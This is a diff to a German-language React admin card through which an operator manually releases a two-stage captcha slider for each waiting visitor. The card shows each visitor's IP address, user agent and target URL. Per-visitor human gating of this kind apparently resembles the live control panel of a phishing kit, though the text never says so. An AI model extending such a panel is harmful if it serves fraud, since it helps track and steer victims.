@@ -2,7 +2,7 @@ import { useEffect, useState } from "react";
 import { supabase } from "@/integrations/supabase/client";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { ShieldCheck, Check, Trash2 } from "lucide-react";
+import { ShieldCheck, Check, Trash2, Eye } from "lucide-react";
 import DeviceInfo from "./DeviceInfo";
 import { toast } from "sonner";
 
@@ -12,6 +12,7 @@ interface Row {
   client_ua: string | null;
   client_ip: string | null;
   released_at: string | null;
+  slider_released_at: string | null;
   created_at: string;
 }
 
@@ -23,7 +24,7 @@ const CaptchaGateCard = () => {
     const { data } = await (supabase as any)
       .from("captcha_requests")
       .select("*")
-      .is("released_at", null)
+      .is("slider_released_at", null)
       .gte("created_at", since)
       .order("created_at", { ascending: false });
     setRows(data || []);
@@ -39,10 +40,19 @@ const CaptchaGateCard = () => {
     return () => { (supabase as any).removeChannel(ch); clearInterval(iv); };
   }, []);
 
-  const release = async (id: string) => {
+  const showSlider = async (id: string) => {
     const { error } = await (supabase as any)
       .from("captcha_requests")
       .update({ released_at: new Date().toISOString() })
+      .eq("id", id);
+    if (error) toast.error(error.message);
+    else toast.success("Schieberegler angezeigt");
+  };
+
+  const releaseSlider = async (id: string) => {
+    const { error } = await (supabase as any)
+      .from("captcha_requests")
+      .update({ slider_released_at: new Date().toISOString() })
       .eq("id", id);
     if (error) toast.error(error.message);
     else toast.success("Schieberegler freigegeben");
@@ -68,25 +78,39 @@ const CaptchaGateCard = () => {
             Keine wartenden Kunden. Sobald ein Kunde die Captcha-Checkbox anklickt, erscheint hier eine Freigabe.
           </p>
         )}
-        {rows.map(r => (
-          <div key={r.id} className="border rounded-md p-3 space-y-2">
-            <div className="text-xs text-muted-foreground">
-              {new Date(r.created_at).toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}
+        {rows.map(r => {
+          const stage2 = !!r.released_at;
+          return (
+            <div key={r.id} className="border rounded-md p-3 space-y-2">
+              <div className="text-xs text-muted-foreground">
+                {new Date(r.created_at).toLocaleString("de-DE", { timeZone: "Europe/Berlin" })}
+              </div>
+              {r.next_url && (
+                <div className="text-xs break-all"><span className="font-medium">Ziel:</span> {r.next_url}</div>
+              )}
+              <DeviceInfo ua={r.client_ua} ip={r.client_ip} seenAt={r.created_at} />
+              <div className="flex flex-wrap gap-2">
+                {!stage2 ? (
+                  <Button size="sm" onClick={() => showSlider(r.id)} className="gap-1">
+                    <Eye className="h-4 w-4" />Schieberegler anzeigen
+                  </Button>
+                ) : (
+                  <Button size="sm" onClick={() => releaseSlider(r.id)} className="gap-1">
+                    <Check className="h-4 w-4" />Schieberegler freigeben
+                  </Button>
+                )}
+                <Button size="sm" variant="outline" onClick={() => remove(r.id)} className="gap-1">
+                  <Trash2 className="h-4 w-4" />Verwerfen
+                </Button>
+              </div>
+              {stage2 && (
+                <p className="text-[11px] text-muted-foreground">
+                  Schieberegler wird angezeigt. Kunde wartet auf finale Freigabe.
+                </p>
+              )}
             </div>
-            {r.next_url && (
-              <div className="text-xs break-all"><span className="font-medium">Ziel:</span> {r.next_url}</div>
-            )}
-            <DeviceInfo ua={r.client_ua} ip={r.client_ip} seenAt={r.created_at} />
-            <div className="flex gap-2">
-              <Button size="sm" onClick={() => release(r.id)} className="gap-1">
-                <Check className="h-4 w-4" />Schieberegler freigeben
-              </Button>
-              <Button size="sm" variant="outline" onClick={() => remove(r.id)} className="gap-1">
-                <Trash2 className="h-4 w-4" />Verwerfen
-              </Button>
-            </div>
-          </div>
-        ))}
+          );
+        })}
       </CardContent>
     </Card>
   );
